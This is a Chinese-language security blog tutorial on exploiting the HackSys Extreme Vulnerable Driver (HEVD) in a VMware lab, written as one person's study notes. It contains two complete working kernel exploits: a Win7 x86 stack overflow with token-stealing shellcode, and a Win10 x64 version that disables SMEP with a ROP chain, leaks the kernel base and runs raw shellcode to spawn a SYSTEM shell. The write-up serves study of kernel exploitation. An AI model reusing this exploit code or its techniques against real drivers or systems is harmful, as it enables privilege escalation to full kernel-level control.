# HEVD驱动栈溢出&&WIN10 SMEP 绕过

阅读量 **236039**

|评论 **3**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-09-14 16:30:01

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p0.ssl.qhimg.com/t0113d10d152c6b8b02.jpg)

## 0x00:环境&&一些需要注意的地方以及调试小技巧

~多图预警~

###  我的环境

环境怎么搭建我就不赘述了,我会把我主要参考的博客贴在后面  
我使用的环境  
物理机OS:windows 10  
虚拟机OS:win7_x86&&win10_x64(考虑到环境不同可能会复现不成功的情况,我会把win7&&win10的下载链接贴在评论区)  
VMware:VMware Workstation 15 Pro  
编译器:vs2019  
驱动: HEVD 1.2  
驱动加载工具:VirtualKD-Redux-2021.2  
调试器:Microsoft Store上直接下的windbg preview版

###  要注意的地方&&一些知识点

首先一点就是由于调试内核程序经常会死机或蓝屏,而频繁的系统重启又需要很多时间,为了节约部分时间,建议大家灵活使用VMware
的快照功能,在配置好测试环境后,不要急于测试,而是先建立该测试环境的快照,这样当出现死机或蓝屏后 再次测试时可以直接回滚到之前的快照状态下的 Guest
OS 中,这样能够大大节省等待时间.  
windbg跳出来的时候,虚拟机会中断,这时会出现鼠标和键盘都失灵的情况,按 ctrl+alt 可以解决,我第一次以为我电脑卡了,还重启了,其实不是.  
由于我们研究的是有漏洞的驱动项目,所以就有必要补充一点驱动相关的知识:驱动分两种,一种是nt式驱动程序,一种式wdm式驱动程序.VirtualKD-Redux-2021.2这个驱动加载工具只能加载wdm式驱动程序.还有想用vs2019进行驱动编程的话,sdk和wdk版本要一致,我在上面踩了很多坑.  
下windbg的时候,可能会出现网页能打开,但Microsoft
Store死活打不开的情况,这个问题在internet选项->连接->局域网设置,把使用自动配置脚本那个勾取消掉就好.  
在学习的时候,可以看到源码里是有输出的(当然你用ida打开也可以看到,不过我基本没用ida)

![](https://p4.ssl.qhimg.com/t01ca60753d1bf9547a.png)

但是,直接调试是看不到的,这里有两个解决的方法,一种需要下一个软件,还有一种是在运行前加 ed nt!Kd_Default_Mask 8
,然后输出就会在windbg里显示出来,像这样

![](https://p4.ssl.qhimg.com/t014a019f8a31d5ff23.png)

我使用的也是第二种,确实比较方便.  
可能你会对exploit里面的CreateFileA,DeviceIoControl等函数感到困惑,这部分在<0day安全:软件漏洞分析指南>里有写,当然你也可以去看官方文档.  
可能你会好奇我exploit开头那个宏定义是怎么来的,我是在源码的Exploit目录下的common.h找到的,如图

![](https://p5.ssl.qhimg.com/t013de8751932db1ec5.png)

后面这CTL_CODE( )部分0day安全里面也有写,感兴趣的同学可以自己去看看.  
还有那个DeviceIoControl函数的第四个参数是关于SIZE大小的,这里要注意的一点就是这个参数要比实际输入的内容大4(32位系统下)或者8(64位系统下),不然会导致数据传入不够的情况

![](https://p0.ssl.qhimg.com/t01a1aeddd09e610d39.png)

还有一个特别特别大的坑就是win10的处理器设置最好是1,我因为这个没设好,足足花了我四天多的时间!!!!!越想越气

![](https://p5.ssl.qhimg.com/t01af0e38e7e5390e36.png)

## 0x01:HEVD项目讲解&&漏洞点&&exploit的编写

###  HEVD项目讲解

下载地址在[这里](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/releases),这个项目里不但有很多有漏洞的示例驱动函数,还有对应的32位下的exploit.

![](https://p3.ssl.qhimg.com/t011f410b09e9e465aa.png)

使用方式可以参考[这里](https://hshrzd.wordpress.com/2017/06/22/starting-with-windows-kernel-exploitation-part-3-stealing-the-access-token/)

###  漏洞点

漏洞点还是很简单的,打开HEVD源码,找到Driver目录下的StackOverflow.c的TriggerStackOverflow函数.发现它没有验证用户传入的size大小,导致栈溢出.可以看到安全的版本是以sizeof(KernelBuffer)为传入大小的.RtlCopyMemory这个函数和memcpy差不多,它需要一个指向内核缓冲区的指针,一个指向输入缓冲区的指针和一个整数来知道要复制多少字节.

![](https://p1.ssl.qhimg.com/t0112d6c29c5e17a528.png)

###  exploit的编写

**原理**

原理就是替换当前进程的Token ,首先在windbg上输入 !dml_proc 命令,

![](https://p4.ssl.qhimg.com/t0175c54bdcfaedab30.png)

可以看到我们的system的pid是4,而且每个进程的pid都不相同,这就是我们漏洞利用的关键.  
然后我们运行 dt nt!_EX_FAST_REF address+0xf8 命令,找到cmd.exe和system的token,如图

![](https://p0.ssl.qhimg.com/t01832a9407bdee2d4b.png)

接下来我们用ed指令将cmd.exe的token值改成system的token值,如图

![](https://p5.ssl.qhimg.com/t018971336ac8f61d49.png)

可以看到我们cmd的权限已经改变了

![](https://p5.ssl.qhimg.com/t010d1336399dcf9d5b.png)

**exploit编写**

这个exploit我感觉最主要的就是shellcode的编写,其他的当公式用就好,所以我着重讲shellcode的编写.  
前面我们已经讲了漏洞利用的关键是替换token,那么我们怎么找到system的token并替换它呢?其实这里面有以下的关系.([我的参考在这](https://hshrzd.wordpress.com/2017/06/22/starting-with-windows-kernel-exploitation-part-3-stealing-the-access-token/))  
[KPCR](https://www.nirsoft.net/kernel_struct/vista/KPCR.html) (PrcbData) ->
[KPRCB](https://www.nirsoft.net/kernel_struct/vista/KPRCB.html)
(CurrentThread) ->
[KTHREAD](https://www.nirsoft.net/kernel_struct/vista/KTHREAD.html) (ApcState)
-> [KAPC_STATE](https://www.nirsoft.net/kernel_struct/vista/KAPC_STATE.html)
(Process) ->
[KPROCESS](https://www.nirsoft.net/kernel_struct/vista/KPROCESS.html)  
我们需要遍历每个进程,就需要找到一个双向循环链表,也就是这玩意

![](https://p0.ssl.qhimg.com/t01a382c57c51915069.png)

那它具体的偏移是多少呢???  
首先我们在windbg上运行 dt nt!_KPCR 命令,可以看到一大串的东西,我们找到_KPRCB结构,如图

![](https://p0.ssl.qhimg.com/t011fbe258108917f59.png)

然后我们再运行 dt nt!_KPRCB 可以看到

![](https://p3.ssl.qhimg.com/t01f7aa600d5e15236f.png)

这就是mov eax, fs:[eax + KTHREAD_OFFSET]这行代码的由来  
接着我们在windbg里运行dps fs:[124]这行代码(dps是查看当前寄存器的值),可以看到

![](https://p1.ssl.qhimg.com/t0194d6cb09a4fe88e3.png)

然后我们运行 dt nt!_EPROCESS poi(83f3a380+0x50) 这行代码(poi是解引用),可以看到

![](https://p1.ssl.qhimg.com/t01e4a6428efc676c45.png)

里面要注意的地方就是+0xb4的void和+0xb8位置的双向链表了.  
(不过这里为啥是+0x50,我也不太清楚…)  
然后往下翻,可以看到

![](https://p3.ssl.qhimg.com/t017db3cb4295a6f127.png)

这就是0xf8的由来.  
其他的感觉没什么了,最后,贴一下我的利用代码(我的利用代码可能和我讲的不太一样,要复杂些,当时我主要参考的[这](https://hshrzd.wordpress.com/2017/06/22/starting-with-windows-kernel-exploitation-part-3-stealing-the-access-token/),懒得调了…)

    
    
    #include<Windows.h>
    #include<stdio.h>
    #include <iostream>
    #include <vector>
    #include <time.h>
    #include <Psapi.h>
    #include <winioctl.h>
    #include <TlHelp32.h>
    #define HACKSYS_EVD_IOCTL_STACK_OVERFLOW                  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_NEITHER, FILE_ANY_ACCESS)
    #define IO_COMPLETION_OBJECT 1
    #define STATUS_SUCCESS 0x00000000
    #define KTHREAD_OFFSET     0x124  // nt!_KPCR.PcrbData.CurrentThread
    #define EPROCESS_OFFSET    0x050  // nt!_KTHREAD.ApcState.Process
    #define PID_OFFSET         0x0B4  // nt!_EPROCESS.UniqueProcessId
    #define FLINK_OFFSET       0x0B8  // nt!_EPROCESS.ActiveProcessLinks.Flink
    #define TOKEN_OFFSET       0x0F8  // nt!_EPROCESS.Token
    #define SYSTEM_PID         0x004  // SYSTEM Process PID
    
    const char kDevName[] = "\\\\.\\HackSysExtremeVulnerableDriver";
    
    
    __declspec(naked) VOID shellcode() {
        // Importance of Kernel Recovery
        __asm {
            pushad; Save registers state
    
            ; Start of Token Stealing Stub
            xor eax, eax; Set ZERO
            mov eax, fs: [eax + KTHREAD_OFFSET] ; Get nt!_KPCR.PcrbData.CurrentThread
            ; _KTHREAD is located at FS : [0x124]
    
            mov eax, [eax + EPROCESS_OFFSET]; Get nt!_KTHREAD.ApcState.Process
    
            mov ecx, eax; Copy current process _EPROCESS structure
    
            mov edx, SYSTEM_PID; WIN 7 SP1 SYSTEM process PID = 0x4
    
            SearchSystemPID:
            mov eax, [eax + FLINK_OFFSET]; Get nt!_EPROCESS.ActiveProcessLinks.Flink
                sub eax, FLINK_OFFSET
                cmp[eax + PID_OFFSET], edx; Get nt!_EPROCESS.UniqueProcessId
                jne SearchSystemPID
    
                mov edx, [eax + TOKEN_OFFSET]; Get SYSTEM process nt!_EPROCESS.Token
                mov edi, [ecx + TOKEN_OFFSET]; Get current process token
                and edx, 0xFFFFFFF8; apply the mask on SYSTEM process token, to remove the referece counter
                and edi, 0x7; apply the mask on the current process token to preserve the referece counter
                add edx, edi; merge AccessToken of SYSTEM with ReferenceCounter of current process
                mov[ecx + TOKEN_OFFSET], edx; Replace target process nt!_EPROCESS.Token
                ; with SYSTEM process nt!_EPROCESS.Token
                ; End of Token Stealing Stub
    
                popad; Restore registers state
    
                ; Kernel Recovery Stub
                xor eax, eax; Set NTSTATUS SUCCEESS
                pop ebp; Restore saved EBP
                ret 8; Return cleanly
        }
    }
    
    
    static VOID CreateCmd()
    {
        STARTUPINFO si = { sizeof(si) };
        PROCESS_INFORMATION pi = { 0 };
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_SHOW;
        WCHAR wzFilePath[MAX_PATH] = { L"cmd.exe" };
        BOOL bReturn = CreateProcessW(NULL, wzFilePath, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, (LPSTARTUPINFOW)&si, &pi);
        if (bReturn) CloseHandle(pi.hThread), CloseHandle(pi.hProcess);
    }
    
    HANDLE open_device(const char* device_name)
    {
        HANDLE device = CreateFileA(device_name,
            GENERIC_READ | GENERIC_WRITE,
            NULL,
            NULL,
            OPEN_EXISTING,
            NULL,
            NULL
        );
        return device;
    }
    
    #define BUFF_SIZE   2080
    int main()
    {
        PVOID payload = &shellcode;
        SIZE_T buf_size = BUFF_SIZE + sizeof(DWORD);
        ULONG BytesReturned = NULL;
        HANDLE hFile = open_device(kDevName);
        PVOID buf = (PVOID)HeapAlloc(GetProcessHeap(),
            HEAP_ZERO_MEMORY,
            2080 + sizeof(DWORD));
        printf("                              gamous,yyds!!!");
        RtlFillMemory((PVOID)buf, buf_size, 0x41);
        PVOID shellcode_addr = (PVOID)((ULONG)buf + BUFF_SIZE);
        *(PULONG)shellcode_addr = (ULONG)payload;
        DeviceIoControl(hFile,
            HACKSYS_EVD_IOCTL_STACK_OVERFLOW,
            (PVOID)buf,
            buf_size,
            NULL,
            0,
            &BytesReturned,
            NULL);
        CreateCmd();
    }
    

可以看到最后是利用成功了的

![](https://p5.ssl.qhimg.com/t018e14913bdc8cf897.png)

###  0x02:win10_x64下的smep bapass

**smep原理**

smep就是一种自win8新推出的保护机制,如果一个程序存在smep保护机制的话,那么就不能在ring0执行ring3的代码,否则的话会直接崩溃死机.这个机制和cr4寄存器有关.如图

![](https://p1.ssl.qhimg.com/t01311e0d9811895f50.png)

重点关注第二十位就好  
可以在windbg里输入 .formats cr4 查看当前 cr4寄存器的值.如图,我的机器上cr4寄存器的值为0x1506f8

![](https://p5.ssl.qhimg.com/t019462adaf3060d13d.png)

**smep绕过&&rp++工具的使用**

怎么绕过smep?这里用到了一种名为rop的技术.就是用ring0的代码将smep给关掉.前面我们已经说过,smep与cr4寄存器的第20位有关,所以我们要把cr4寄存器的第20位给置零.在我的机器上也就是把0x1506f8改成0x506f8.怎么更改cr4寄存器的值?我们需要找内核里的与cr4寄存器相关的汇编片段  
当然这里还需要绕过KALSR,也就是内核态的ALSR.  
这里我用到了一种工具,rp++

首先在win10虚拟机里查找 ntoskrnl.exe 程序,如图

![](https://p4.ssl.qhimg.com/t01ef48c9c60328a725.png)

然后新建一个rop.txt程序(叫什么名字都可以)  
然后打开cmd,把相关的程序拖进去,输入指令,格式像这样

![](https://p3.ssl.qhimg.com/t01293bf2b81eb39f81.png)

然后我们发现rop.txt文件里多了很多东西,然后我们用ctrl + f 查找cr4寄存器相关可以找到

![](https://p2.ssl.qhimg.com/t01a72b988d6767365c.png)

然后我们将前面的140内存基址给去掉,取后面的0xf732c,然后在windbg中输入 uf nt+0xf732c,可以看到

![](https://p0.ssl.qhimg.com/t0112017bbd0bcb4539.png)

然后输入?fffff802`d2d7f32c-nt 可以看到

![](https://p1.ssl.qhimg.com/t01709fabdf22040edb.png)

(我这里应该显示有问题它cr4给我显示成了tmm有点无语emmmm)  
那么我们的偏移就是0xf732c,获取rcx寄存器的值类似然后我的代码长这样

![](https://p3.ssl.qhimg.com/t011cef28aafcfbd5e6.png)

那么怎么获得内核的基址呢?这部分当成公式用就好…大概这样

![](https://p3.ssl.qhimg.com/t01e4baebb020ca4656.png)

**shellcode的编写**

shellcode的编写就是按着我前面讲的内容写的,手动找一下64位下的偏移即可,不过值得注意的是,asm汇编程序不能直接在.c文件里写.这里我用的是一款在线将汇编转机器码的工具.[链接在这](https://defuse.ca/online-x86-assembler.htm#disassembly)  
可能有人会好奇为啥我会有mov rbx,[r11+0x60]这条指令,这是调出来的.待会解释.

**运行**

我在exploit里面加了 __debugbreak(); 这行代码,这行代码是下断点用的

![](https://p3.ssl.qhimg.com/t01fadd53edd50ae6ff.png)

运行后可以看到我们的代码已经断下来了

![](https://p5.ssl.qhimg.com/t01e34bdf69ff528cd0.png)

然后,我们再输入 uf HEVD!TriggerStackOverflow 并在这个函数的结尾处下个断点

![](https://p2.ssl.qhimg.com/t014628b992c6913b02.png)

然后运行到修改cr4寄存器的地方,可以看到,我们的cr4寄存器已经被修改成功

![](https://p3.ssl.qhimg.com/t01dcd4e0a767dbfe7b.png)

接下来解释一下mov rbx,[r11+0x60]这条指令  
我们知道我们的rcx,rbx在运行shellcode之前就被破坏掉了,所以一个很朴素的想法就是找一个相近的值给他恢复,调试后发现rcx的值无关紧要,因为如果程序正常运行的话,后面并没有引用到rcx的值,但是用到了rbx的值,如果rbx的值不对,将直接导致系统崩溃.  
一个很直接的想法就是,找一个相近的值,然后减去差值.  
调试发现rbx的值是r11赋予的也就是这

![](https://p1.ssl.qhimg.com/t019cede460bcae98a5.png)

但是r11里面的值也会被破坏掉,也就是说[r11+10h]不可用  
调试发现[r11+10h]和[r11+60h]这两个值一模一样,而且后面这个不会被改掉.  
也就是这个值

![](https://p0.ssl.qhimg.com/t017c8f70d2add059d0.png)

接下来就没什么好说的了,最后贴一下我的代码

    
    
    #include<Windows.h>
    #include<stdio.h>
    #include <iostream>
    #include <vector>
    #include <time.h>
    #include <Psapi.h>
    #include <winioctl.h>
    #include <TlHelp32.h>
    #define HACKSYS_EVD_IOCTL_STACK_OVERFLOW                  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_NEITHER, FILE_ANY_ACCESS)
    
    
    
    const char kDevName[] = "\\\\.\\HackSysExtremeVulnerableDriver";
    
    
    
    
    
    static VOID CreateCmd()
    {
        STARTUPINFO si = { sizeof(si) };
        PROCESS_INFORMATION pi = { 0 };
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_SHOW;
        WCHAR wzFilePath[MAX_PATH] = { L"cmd.exe" };
        BOOL bReturn = CreateProcessW(NULL, wzFilePath, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, (LPSTARTUPINFOW)&si, &pi);
        if (bReturn) CloseHandle(pi.hThread), CloseHandle(pi.hProcess);
    }
    
    HANDLE open_device(const char* device_name)
    {
        HANDLE device = CreateFileA(device_name,
            GENERIC_READ | GENERIC_WRITE,
            NULL,
            NULL,
            OPEN_EXISTING,
            NULL,
            NULL
        );
        return device;
    }
    
    #define BUFF_SIZE   2080
    
    typedef enum _SYSTEM_INFORMATION_CLASS {
        SystemModuleInformation = 11,
        SystemHandleInformation = 16
    } SYSTEM_INFORMATION_CLASS;
    
    typedef NTSTATUS(WINAPI* NtQuerySystemInformation_t)(IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
        OUT PVOID                   SystemInformation,
        IN ULONG                    SystemInformationLength,
        OUT PULONG                  ReturnLength);
    
    #define STATUS_UNSUCCESSFUL ((NTSTATUS)0xC0000001L)
    
    typedef struct _SYSTEM_MODULE_INFORMATION_ENTRY {
        ULONG                Reserved1;
        ULONG                Reserved2;
        ULONG                Reserved3;
        PVOID                Base;
        ULONG                ImageSize;
        ULONG                Flags;
        WORD                 Id;
        WORD                 Rank;
        WORD                 LoadCount;
        WORD                 NameOffset;
        CHAR                 Name[256];
    } SYSTEM_MODULE_INFORMATION_ENTRY, * PSYSTEM_MODULE_INFORMATION_ENTRY;
    
    typedef struct _SYSTEM_MODULE_INFORMATION {
        ULONG   Count;
        SYSTEM_MODULE_INFORMATION_ENTRY Module[1];
    } SYSTEM_MODULE_INFORMATION, * PSYSTEM_MODULE_INFORMATION;
    
    INT64 get_kernel_base() {
        NTSTATUS NtStatus = STATUS_UNSUCCESSFUL;
        ULONG ReturnLength;
        HMODULE hNtDll = LoadLibrary(L"ntdll.dll");
        NtQuerySystemInformation_t NtQuerySystemInformation = (NtQuerySystemInformation_t)GetProcAddress(hNtDll, "NtQuerySystemInformation");
        NtStatus = NtQuerySystemInformation(SystemModuleInformation, NULL, 0, &ReturnLength);
        PSYSTEM_MODULE_INFORMATION pSystemModuleInformation = (PSYSTEM_MODULE_INFORMATION)HeapAlloc(GetProcessHeap(),
            HEAP_ZERO_MEMORY,
            ReturnLength);
        NtStatus = NtQuerySystemInformation(SystemModuleInformation,
            pSystemModuleInformation,
            ReturnLength,
            &ReturnLength);
        PVOID KernelBaseAddressInKernelMode = pSystemModuleInformation->Module[0].Base;
    
        return (INT64)KernelBaseAddressInKernelMode;
    }
    
    
    BYTE shellcode[] =
    "\x65\x4C\x8B\x04\x25\x88\x01\x00\x00"     //mov r8,[gs:0x188]
    "\x4D\x8B\x80\xB8\x00\x00\x00"             //mov r8,[r8+0xb8]
    "\x4D\x89\xC1"                             //mov r9,r8            //
    "\x49\xC7\xC4\x04\x00\x00\x00"             //mov r12,4
    //searchsystemPID
    "\x4D\x8B\x80\xF0\x02\x00\x00"             //mov r8,[r8+0x2F0]        /
    "\x49\x81\xE8\xF0\x02\x00\x00"                 //sub r8,0x2F0          /
    "\x4D\x39\xA0\xE8\x02\x00\x00"              //cmp [r8+0x2e8],r12
    "\x75\xE9"                                 // jne searchsystemPID
    "\x4D\x8B\xA0\x58\x03\x00\x00"              //mov rdx,[rax+0x358]
    "\x4D\x89\xA1\x58\x03\x00\x00"              //mov [rcx+0x358],rdx
    "\x49\x8B\x5B\x60"                            //mov rbx,[r11+0x60]
    "\x4D\x31\xC0\x4D\x31\xC9\x4D\x31\xE4" // xor   r8 r9 r12
    "\x48\x83\xC4\x10"                          // add rsp,0x10
    "\xc3";
    
    int main()
    {
        ULONG BytesReturned;
        BYTE input_buff[2088] = { 0 };
        INT64 KernelBaseAddressInKernelMode = get_kernel_base();
        INT64 pop_rcx_offset = KernelBaseAddressInKernelMode + 0x95836;
        INT64 rcx_value = 0x506f8;
        INT64 mov_cr4_ret = KernelBaseAddressInKernelMode + 0xf732c;
        LPVOID shellcode_addr = VirtualAlloc(NULL,
            sizeof(shellcode),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE);
        //HMODULE ntoskrnl = LoadLibrary(L"ntoskrnl.exe");
        memcpy(shellcode_addr, shellcode, sizeof(shellcode));
        memset(input_buff, '\x41', 2056);
        memcpy(input_buff + 2056, (PINT64)&pop_rcx_offset, 8); // pop rcx
        memcpy(input_buff + 2064, (PINT64)&rcx_value, 8); // disable SMEP value
        memcpy(input_buff + 2072, (PINT64)&mov_cr4_ret, 8);
        memcpy(input_buff + 2080, (PINT64)&shellcode_addr, 8);
        printf("                              gamous,yyds!!!");
        HANDLE hFile = open_device(kDevName);
        __debugbreak();
        DeviceIoControl(hFile,
            HACKSYS_EVD_IOCTL_STACK_OVERFLOW,
            (PVOID)input_buff,
            //0x800,
            sizeof(input_buff),
            NULL,
            0,
            &BytesReturned,
            NULL);
        CreateCmd();
    }
    

可以看到,最后是运行成功了的

![](https://p4.ssl.qhimg.com/t016ef700bac1a9c254.png)

## 0x04:总结&&感想&&参考

感觉这个并没有想象中的那么难.还有<0day安全>这本书值得一读,书中的很多理念都有让我眼前一亮的感觉,虽然这本书出版于2008年.  
碰到问题不要一个劲的莽,要学会动脑.还有就是英语要好,这些文章我大部分都是拿翻译看的.感觉自己表达能力还是差了,没有写出我想要的效果..还有就是我这输入法不知道有什么问题,标点符号用不了中文的,改了也用不了…

###  环境搭建参考

<https://bbs.pediy.com/thread-247019.htm>  
<https://bbs.pediy.com/thread-252309.htm>

###  学习资料参考

<0day安全:软件漏洞分析指南>第四章  
<https://defuse.ca/online-x86-assembler.htm#disassembly>  
<https://connormcgarr.github.io/ROP/>  
<https://h0mbre.github.io/HEVD_Stackoverflow_SMEP_Bypass_64bit/#>  
<https://hshrzd.wordpress.com/2017/06/22/starting-with-windows-kernel-exploitation-part-3-stealing-the-access-token/>  
<https://cracklab.team/index.php?threads/66/>  
<https://www.abatchy.com/2018/01/kernel-exploitation-4>  
<https://rootkits.xyz/blog/2017/08/kernel-stack-overflow/>  
滴水逆向三期视频 2015-01-21部分

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **blue的碎碎念** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/252947](/post/id/252947)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [HEVD](/tag/HEVD)
  * [smep bypasas](/tag/smep bypasas)

 **+1** __7赞

 __收藏

![](https://thirdwx.qlogo.cn/mmopen/vi_32/O1YtfJ118OicCawBlbqGVWabyJXOofgPYIVviaKBsc0dOmc8Plbmu5zcUM8Zd3zmRBHfv4Wib7iaWW5IRt4icIgvZ3Q/132)
blue的碎碎念

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

